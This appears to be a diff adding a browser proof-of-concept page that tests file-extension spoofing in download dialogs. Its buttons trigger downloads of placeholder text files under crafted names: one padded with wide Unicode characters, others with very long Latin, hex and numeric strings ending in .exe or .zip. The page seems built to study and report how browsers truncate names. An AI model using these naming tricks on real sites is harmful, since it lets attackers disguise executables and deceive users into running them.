@@ -1,0 +1,67 @@
+<html lang="en">
+
+<head>
+
+</head>
+
+<body>
+
+  <h1>File name ext truncated Spoof</h1>
+
+  <div><button onclick="normal1()">Normal</button></div><br />
+  <div><button onclick="normal2()">Normal Long no space</button></div><br />
+
+  <div><button onclick="triggerDownload()">Spoof file</button></div><br>
+
+  <div><button onclick="exploit()">short exploit</button></div>
+
+</body>
+
+
+
+<script>
+  function triggerDownload() {
+
+    var a = document.createElement('a');
+
+    a.download =
+      "꧁file꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁꧁.txt";
+    a.href = "data:text/plain,This is an evil executable"
+    a.click();
+  }
+
+
+  function normal1() {
+
+    var a = document.createElement('a');
+
+    a.download =
+      "Dictum Sapien Eget Elementum Commodo Libero Tortor Praesent Convallis Nisl Vestibulum Iaculis Maecenas Non Facilisis Consequat Egestas Quis Feugiat Pretium Luctus Dictum Habitant Donec Ut Faucibus Varius Risus In Fusce Amet Integer Posuere Eget Vel Sollicitudin Vitae Nostra Nisl Senectus Consectetur Pretium Nostra Aliquam Laoreet Nec Risus A Sit Fames.exe";
+    a.href = "data:text/plain,This is an evil executable"
+    a.click();
+  }
+
+  function normal2() {
+
+    var a = document.createElement('a');
+
+    a.download =
+      "35b15caa8a9b7ed19dfe017b3e9147c9d0a22353133fff84d71371f7e93fb74835b15caa8a9b7ed19dfe017b3e9147c9d0a22353133fff84d71371f7e93fb74835b15caa8a9b7ed19dfe017b3e9147c9d0a22353133fff84d71371f7e93fb748.exe";
+    a.href = "data:text/plain,This is an evil executable"
+    a.click();
+  }
+
+
+
+  function exploit() {
+
+    var a = document.createElement('a');
+
+    a.download =
+      "filename-long-123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789123456789.zip";
+    a.href = "data:text/plain,This is an evil executable"
+    a.click();
+  }
+</script>
+
+</html>
